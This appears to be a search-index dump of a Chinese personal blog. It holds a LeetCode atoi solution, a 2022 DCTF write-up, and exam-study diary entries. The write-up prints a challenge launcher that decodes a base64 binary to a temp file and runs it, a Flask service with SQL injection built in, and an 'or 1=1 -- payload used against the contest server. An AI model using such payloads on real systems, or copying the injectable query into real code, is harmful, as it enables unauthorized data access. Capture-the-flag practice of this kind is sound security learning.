这题有点变态，不能忽视任何其他字符，会有正负数，会有科学计数法，而且不能超出范围。奇葩用例： 每次python的一行做法都能惊艳到我，大佬牛逼啊，传送门 让我诧异的是关于python中关于*的使用 大佬放话了: 也就是把只有一个元素的int列表转换成int，测试： 步骤： 先将字符串空格删除 re正则匹配，结果为列表类型 将匹配成功的列表”解包” 匹配成功的字符串，转换成int类型 min函数(XXX，2**31-1)，确定上界限 max函数(XXX，-2**31)，确定下界限 1234import reclass Solution: def myAtoi(self, s: str) -&gt; int: return max(min(int(*re.findall('^[\\+\\-]?\\d+', s.lstrip())), 2**31 - 1), -2**31) ^ 是不取的意思，[]是选择，?是出现一次或没有，\\d+是出现一次或多次，\\ +是因为+是特殊字符相当于转义","link":"/2022/03/01/%E7%AE%97%E6%B3%95/leetcode-%E6%AF%8F%E6%97%A5%E7%BB%83%E4%B9%A0/"},{"title":"2022DCTF","text":"比赛中就做出了一题seek…… Seek (c逆向) seek是给我们的C代码， 也就是我们的flag文件中需要满足这些下面的这些条件 我们需要的就是这两列数据， 我把这两排数据提取到文本中，从文本读取数据，放入两个列表中，然后组成字典，然后按字典的键进行排序 1234567891011121314151617181920addrs = []contents = []with open(&quot;f.txt&quot;,&quot;r&quot;) as f: s = f.readlines() for line in s: lis = line.strip() l = lis.split(&quot; &quot;) addrs.append(int(l[0])) contents.append(int(l[1]))# 合并成字典dic = dict(zip(addrs,contents))# 按键值排序dics = sorted(dic.items(), key=lambda item:item[0], reverse=False)flag = &quot;&quot;for i in dics: flag += chr(i[1])print(flag) euler_license (sql注入+猜数字) 给出我们windows power shell脚本 1234567891011121314151617181920212223242526272829303132333435363738echo ` eval 'binary_linux=&quot;IyEvdXNyL2Jpbi9weXRob24zCgpmcm9tIGZsYXNrIGltcG9ydCBGbGFzaywgcmVxdWVzdAppbXBvcnQgc3FsaXRlMwppbXBvcnQgb3MKCmFwcCA9IEZsYXNrKF9fbmFtZV9fKQoKQGFwcC5yb3V0ZSgiL2xpY2Vuc2VfY2hlY2siKQpkZWYgbGljZW5zZUNoZWNrKCk6CgogICAgY29uID0gc3FsaXRlMy5jb25uZWN0KCJmaWxlOmN0Zi5kYj9tb2RlPXJvIikKICAgIGN1ciA9IGNvbi5jdXJzb3IoKQogICAgdHJ5OgogICAgICAgIGxpY2UgPSByZXF1ZXN0LmFyZ3MuZ2V0KCJsaWNlbnNlX2tleSIpCiAgICAgICAgcXVlcnkgPSAiU0VMRUNUICogRlJPTSBsaWNlbnNlX2tleXMgV0hFUkUgbGljZW5zZV9rZXkgPSAnIiArIGxpY2UgKyAiJzsiCgoKICAgICAgICBjdXIuZXhlY3V0ZShxdWVyeSkKICAgICAgICByZXMgPSBjdXIuZmV0Y2hhbGwoKQogICAgCiAgICAgICAgY3VyLmNsb3NlKCkKICAgICAgICBjb24uY2xvc2UoKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGN1ci5jbG9zZSgpCiAgICAgICAgY29uLmNsb3NlKCkKICAgICAgICByZXR1cm4gc3RyKGUpLCA1MDAKCiAgICByZXR1cm4gc3RyKHJlcykKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgYXBwLnJ1bihob3N0PSIwLjAuMC4wIiwgcG9ydD04MDgwKQo=&quot;binary_mac=&quot;&quot;fname=$(echo $RANDOM | base64 | head -c 20)if [ &quot;$(uname)&quot; = &quot;Darwin&quot; ] &amp;&amp; [ &quot;$binary_mac&quot; != &quot;&quot; ];then echo $binary_mac | base64 -d &gt; /tmp/$fname chmod +x /tmp/$fname /tmp/$fname $@ &gt; \\`lsof -p $$ -F fn | grep -h -A 1 -r &quot;^f1$&quot; | tail -n 1 | sed -n &quot;s/^n//p&quot;\\` rm /tmp/$fnameelif [ &quot;$binary_linux&quot; != &quot;&quot; ];then echo $binary_linux | base64 -d &gt; /tmp/$fname chmod +x /tmp/$fname /tmp/$fname $@ &gt; \\` readlink -f /proc/$$/fd/1 \\` rm /tmp/$fnamefikill -2 $$;' ` &gt; $null#Powershell$binary_win = &quot;quot;$rand_path = $env:TEMP +&quot;\\\\&quot;+ -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}) + &quot;.exe&quot;$bytes=[Convert]::FromBase64String($binary_win)[IO.File]::WriteAllBytes( $rand_path, $bytes)&amp; &quot;$rand_path&quot; $argsrm $rand_path 给了我们一份base64加密的服务器运行脚本 123456import base64string = b&quot;IyEvdXNyL2Jpbi9weXRob24zCgpmcm9tIGZsYXNrIGltcG9ydCBGbGFzaywgcmVxdWVzdAppbXBvcnQgc3FsaXRlMwppbXBvcnQgb3MKCmFwcCA9IEZsYXNrKF9fbmFtZV9fKQoKQGFwcC5yb3V0ZSgiL2xpY2Vuc2VfY2hlY2siKQpkZWYgbGljZW5zZUNoZWNrKCk6CgogICAgY29uID0gc3FsaXRlMy5jb25uZWN0KCJmaWxlOmN0Zi5kYj9tb2RlPXJvIikKICAgIGN1ciA9IGNvbi5jdXJzb3IoKQogICAgdHJ5OgogICAgICAgIGxpY2UgPSByZXF1ZXN0LmFyZ3MuZ2V0KCJsaWNlbnNlX2tleSIpCiAgICAgICAgcXVlcnkgPSAiU0VMRUNUICogRlJPTSBsaWNlbnNlX2tleXMgV0hFUkUgbGljZW5zZV9rZXkgPSAnIiArIGxpY2UgKyAiJzsiCgoKICAgICAgICBjdXIuZXhlY3V0ZShxdWVyeSkKICAgICAgICByZXMgPSBjdXIuZmV0Y2hhbGwoKQogICAgCiAgICAgICAgY3VyLmNsb3NlKCkKICAgICAgICBjb24uY2xvc2UoKQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgIGN1ci5jbG9zZSgpCiAgICAgICAgY29uLmNsb3NlKCkKICAgICAgICByZXR1cm4gc3RyKGUpLCA1MDAKCiAgICByZXR1cm4gc3RyKHJlcykKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgYXBwLnJ1bihob3N0PSIwLjAuMC4wIiwgcG9ydD04MDgwKQo=&quot;f = base64.b64decode(string)print(f)#b'#!/usr/bin/python3\\n\\nfrom flask import Flask, request\\nimport sqlite3\\nimport os\\n\\napp = Flask(__name__)\\n\\n@app.route(&quot;/license_check&quot;)\\ndef licenseCheck():\\n\\n con = sqlite3.connect(&quot;file:ctf.db?mode=ro&quot;)\\n cur = con.cursor()\\n try:\\n lice = request.args.get(&quot;license_key&quot;)\\n query = &quot;SELECT * FROM license_keys WHERE license_key = \\'&quot; + lice + &quot;\\';&quot;\\n\\n\\n cur.execute(query)\\n res = cur.fetchall()\\n \\n cur.close()\\n con.close()\\n except Exception as e:\\n cur.close()\\n con.close()\\n return str(e), 500\\n\\n return str(res)\\n\\n\\nif __name__ == &quot;__main__&quot;:\\n app.run(host=&quot;0.0.0.0&quot;, port=8080)\\n' 12345678910111213141516171819202122232425262728293031#b'#!/usr/bin/python3from flask import Flask, requestimport sqlite3import osapp = Flask(__name__)@app.route(&quot;/license_check&quot;)def licenseCheck(): con = sqlite3.connect(&quot;file:ctf.db?mode=ro&quot;) cur = con.cursor() try: lice = request.args.get(&quot;license_key&quot;) query = &quot;SELECT * FROM license_keys WHERE license_key = \\'&quot; + lice + &quot;\\';&quot; cur.execute(query) res = cur.fetchall() cur.close() con.close() except Exception as e: cur.close() con.close() return str(e), 500 return str(res)if __name__ == &quot;__main__&quot;: app.run(host=&quot;0.0.0.0&quot;, port=8080) 在大佬paixiaoxing的帮助下，成功的获得了flag的后半段 1https://euler.dragonsec.si/license_check?license_key='or 1=1 -- 下面base64加密的客户端可执行文件，在网上找个二进制写入文件的脚本跑一下 12345678910import base64import structcode = b&quot;&quot;c = base64.b64decode(code)lis = list(c)with open(&quot;f.bin&quot;,&quot;wb&quot;) as f: for x in lis: a = struct.pack('B',x) f.write(a)print(&quot;done&quot;) 用010查看一下，成功写入 查个壳 看起来貌似很简单，但是实际上就是根据你输入的，输出字符串 根据前面的函数确定是素数，而且输入的位数是10位，wp中写到和欧拉有关，想了一会儿，题目的名字就叫欧拉的许可证…… 这边的wp貌似是猜出来这个数字的…… dctf{2147483647_python_is_easy_to_reverse} 猜也就算了，re题里面还放了sql注入……彻底麻了 详细请移步到这边","link":"/2022/04/18/CTF/2022DCTF/"},{"title":"Summary from 4.17 to 4.23","text":"About 4.17 This Week 完成事项数学 线代基础1/2节课复盘 4.19一节线代复习课 知能行积分1一阶段满 知能行积分2一阶段89% 知能行两日综合测试 986选填第三章不定积分&amp;订正与复盘 英语 6500恋练有词一轮完成 专业课院校确定下来了,考研机构的申请表填写了,现在是真的没有时间开始学专业课 其他 整理自己的博客 未完成事项 4.19线代复习课的复盘 一周精读两篇阅读理解&amp;一篇英二翻译 未完成事项原因总想着赶紧刷知能行,结果就轻视了线代和英语的学习 下周待做事项 每日背数学公式 0.5h 每日背单词 1h 一周精读两篇阅读理解&amp;一篇英二翻译 知能行积分2 一阶段满 知能行定积分应用 一阶段满 986选填第四章定积分&amp;订正与复盘 986选填第五章定积分&amp;订正与复盘 986选填第六章定积分&amp;订正与复盘 情感 思考 观点4.22花了两三个小时,把P.Z大佬的每篇周总结和月总结的博客观摩了一遍,其中有太多我需要学习的地方了,现在我和z1r0大师傅想法一样:P.Z的人生太励志 自学高考考大学,满怀激情的学习逆向,背单词学数学坚持一年多,兼职讲课录视频,长年累月地打CTF并复盘总结,每日练习钢琴,冥想,每周总结规划…… 太多太多了,从不断被人质疑到不断超越自己,逃离周围舒适圈,对自己有明确的规划,热爱生活,懂得当下的力量并享受孤独… “人的记忆总会遗忘，唯有文字照片与视频才会永远的记录下去.” P.Z两年的博客都有提到这段话.有很长一段的时间一直在用一本笔记来记录自己的生活,但是久而久之就趋于压抑,就陷入到会议中了.当然,这段日子自己也在用oneNote来做每日规划,但是没有办法吐露心声.z1r0大师傅给的建议很对,是要写每周总结,就和当初在viol1t中一样!!! 这段时间当然也有锻炼,身体才是革命的本钱. 自己也在不断的焦虑与内耗,自己也是一个人在战斗,进度却太慢了… 下周打算用番茄ToDo来计算自己每日的学习时长 4.23感觉跟着机构的数学来学,要完蛋…","link":"/2023/04/22/diary/4.17-4.23/"},{"title":"Summary from 4.24 to 4.30","text":"About 4.24 This Week 待完成事项 每日背数学公式 0.5h 每日背单词 1h 一周精读两篇阅读理解&amp;一篇英二翻译 知能行积分2 一阶段满 知能行定积分应用 一阶段满 986选填第四章定积分&amp;订正与复盘 986选填第五章定积分&amp;订正与复盘 986选填第六章定积分&amp;订正与复盘 未完成事项原因下周待做事项 每日背数学公式 0.5h 每日背单词 1h 一周精读两篇阅读理解&amp;一篇英二翻译 情感 思考 观点4.24抓紧一切时间来学知能行… 4.25 “从时间中解脱出来就是:从你在过去中寻找认同感的心理需要以及在未来中寻找满足的心理需要中解放出来.” –摘选自&lt;当下的力量&gt; 最近说实话,心态有些小崩,总是忍不住的想自己的数学进度的问题… 自己也一直在学数学,同时期开始的人都已经概率论结束了,自己线代还没结束,高数基础题也没刷完… 不知道自己哪里出现了问题,为了不让自己后面焦虑,总结一下自己的数学的学习历程: 1.1-1.26日看武忠祥的基础班,做学习包,做三大计算 听网上说要先听课,再练计算,一边跟着武神的基础课视频,一边做学习包,写三大计算,自己也在OneNote上对错题进行整理.中间过年间断了一周,其中还花了两三天的时间看了看启航考研规划(那个时候对考研整个流程体系是一点都不懂),年后去买了MateBook E Go(arm架构windows11平板笔记本),从来没有用过平板记笔记,上手也花了两三天. 然后从1月底到二月初,就一直在焦虑要不要报班,可能是自己的内心不够强大吧…回头看看,其实这个时候学习的状态挺好的… 1.29-2.21日 听考研班数学基础班 从1.29-2.21号,一直在听考研班拉下的课程(考研班从去年9月份就开始数学了,二十天听人三四个月的课程…)其中2.19-2.23在补笔记,(真的要命,我们机构是没有把考点印给我们,我也是太天真了,换做现在的我,直接淘宝买个10块钱的小侯七醒脑公式,立刻开始背公式…) 2.28-3.20日 一/二刷三大计算 中间也穿插着考研课程,田静长难句的学习 自己的三大计算刷题,每天都是把前一天的错题二刷的,所有也花费了很久(其实这个时候就应该做课后讲义的) 3.22-4.6日 补考研数学基础班的课后讲义 后面发现课程看的那么多,题一点都没做,开始焦虑,把讲义上所有的题实打实的做了一遍,然后做后面课后习题,并订正 4.7-4.25 知能行+986选择填空 4.25也就是今天,知能行上手有18天了(可以说抵得上之前我一个月的学习) 知能行进度: **986选填目前进度:**第四章定积分完成并已订正 只看课不刷题是真的不可取,必须看一章视频,刷一专题知能行,练一章986(其他习题册也可),三位一体!! 便览整个学习过程,真正开始学数学是从3.22号刷讲义课后习题开始的 自己这个时候慢就慢些吧,而且自己是四月二十号左右才确定考数一的 过去就给自己长教训了,从现在开始玩命学数学还是来得及的,考研之旅一定是心态之战,享受当下即是解药. 焦虑,紧张,不安,压力,烦恼–所有形式的恐惧,都是因为对未来过于关注而对当下关注不够所引起的. –摘选自&lt;当下的力量&gt;","link":"/2023/04/24/diary/4.24-4.30/"}],"tags":[{"name":"年度总结","slug":"年度总结","link":"/tags/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"},{"name":"BUU-crypto","slug":"BUU-crypto","link":"/tags/BUU-crypto/"},{"name":"nullbook","slug":"nullbook","link":"/tags/nullbook/"},{"name":"CTF复现","slug":"CTF复现","link":"/tags/CTF%E5%A4%8D%E7%8E%B0/"},{"name":"rsa","slug":"rsa","link":"/tags/rsa/"},{"name":"CTF赛后复现","slug":"CTF赛后复现","link":"/tags/CTF%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/"},{"name":"BUU-reverse练习","slug":"BUU-reverse练习","link":"/tags/BUU-reverse%E7%BB%83%E4%B9%A0/"},{"name":"reverse","slug":"reverse","link":"/tags/reverse/"},{"name":"攻防世界_pwn","slug":"攻防世界-pwn","link":"/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn/"},{"name":"anroid","slug":"anroid","link":"/tags/anroid/"},{"name":"攻防世界-re","slug":"攻防世界-re","link":"/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re/"},{"name":"常见加密算法","slug":"常见加密算法","link":"/tags/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95/"},{"name":"算法","slug":"算法","link":"/tags/%E7%AE%97%E6%B3%95/"},{"name":"diary","slug":"diary","link":"/tags/diary/"}],"categories":[]}